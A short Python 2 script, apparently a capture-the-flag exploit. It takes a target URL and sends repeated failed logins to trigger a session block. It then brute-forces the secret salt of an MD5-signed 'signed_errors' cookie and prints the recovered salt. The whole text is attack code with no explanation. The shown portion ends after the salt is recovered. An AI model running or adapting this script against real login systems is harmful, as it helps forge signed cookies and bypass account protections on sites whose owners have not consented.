#!/usr/bin/python

from hashlib import md5
import requests
import random
import sys

url = sys.argv[1]
sess = requests.Session()

# Block session
print '[-] Blocking session'
for i in range(6):
    r = sess.post(url, data = {'login': 'toto', 'password': 'toto'})
    
# BF Salt
print '[-] BFing salt'
signed5 = sess.cookies['signed_errors']
SALT = None
for i in range(1000000, 10000000):
    if md5(str(i)+'5').hexdigest() == signed5:
        SALT = str(i)
        break
               
assert SALT is not None
print '[+] SALT = %s' % SALT
